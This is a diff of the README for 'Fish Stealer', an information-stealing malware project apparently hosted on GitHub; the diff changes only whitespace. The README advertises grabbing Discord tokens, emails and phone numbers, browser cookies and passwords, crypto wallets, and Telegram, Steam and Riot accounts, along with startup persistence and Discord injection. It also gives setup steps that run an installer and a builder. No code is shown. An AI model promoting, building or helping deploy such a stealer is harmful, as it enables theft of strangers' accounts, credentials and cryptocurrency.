@@ -1,28 +1,28 @@
                                                  Fish Stealer
-                                                 ============
+                                                
 ![1](https://github.com/TheOneAndOnlyTermux/Fish-Grabber/assets/152316964/5f33a5b6-07ad-4f2d-bab7-d8238e4930b5)
                                                   🤖 Features
-. Grab Discord Token, Phone Number, E-mail and HQ Friends.
+ . Grab Discord Token, Phone Number, E-mail and HQ Friends.
 
-. Startup
+ . Startup
 
-. Discord Injection:
+ . Discord Injection:
 
-. Grab Browser cookies & passwords
+ . Grab Browser cookies & passwords
 
-. Grab specials files
+ . Grab specials files
 
-. Grab Crypto Wallets. 🦊 Metamask, 🅰️ Atomic, 👾 Exodus, 🅱️ Binance, 💰 Coinbase, 🟡 Trust, 👻 Phantom
+ . Grab Crypto Wallets. 🦊 Metamask, 🅰️ Atomic, 👾 Exodus, 🅱️ Binance, 💰 Coinbase, 🟡 Trust, 👻 Phantom
 
-. Grab Telegram
+ . Grab Telegram
 
-. Grab Steam
+ . Grab Steam
 
-. Grab Riot Games
+ . Grab Riot Games
                                                 ⬇️ Setup
-. first open install.bat
+ . first open install.bat
 
-. open builder.bat
+ . open builder.bat
 
 ![2](https://github.com/TheOneAndOnlyTermux/Fish-Grabber/assets/152316964/92e684ff-f510-4c84-8111-13a74275e5d9)
                                                    🖼️ Pictures
